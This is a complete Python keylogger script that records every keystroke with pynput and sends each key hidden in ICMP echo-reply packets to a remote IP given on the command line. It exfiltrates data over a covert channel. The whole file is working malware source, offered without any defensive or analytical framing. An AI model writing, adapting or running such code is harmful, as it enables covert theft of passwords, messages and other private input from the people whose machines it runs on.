#!/usr/bin/env python3
from scapy.all import IP, ICMP, Raw, send, conf
from pynput import keyboard
import argparse

# Variables
ICMP_ID = int(13170)
TTL = int(64)

# Argument Parser
parser = argparse.ArgumentParser()
parser.add_argument('-i', '--interface', type=str, required=True, help="Network Interface (e.g., eth0)")
parser.add_argument('-d', '--destination_ip', type=str, required=True, help="Destination IP address")
args = parser.parse_args()

# Set the Scapy configuration for the specified interface
conf.iface = args.interface

def send_icmp_payload(key_data):
    try:
        # Encode the key data as bytes
        payload = key_data.encode()
    except Exception as e:
        payload = str(e).encode()

    # Craft and send the ICMP packet
    packet = IP(dst=args.destination_ip, ttl=TTL)/ICMP(type=0, id=ICMP_ID)/Raw(load=payload)
    send(packet, verbose=0)

def on_press(key):
    if hasattr(key, 'char') and key.char:
        key_data = key.char
    else:
        key_data = '{' + key.name + '}'
    send_icmp_payload(key_data)

# Start the keylogger
print("[+] ICMP Keylogger started!")
listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
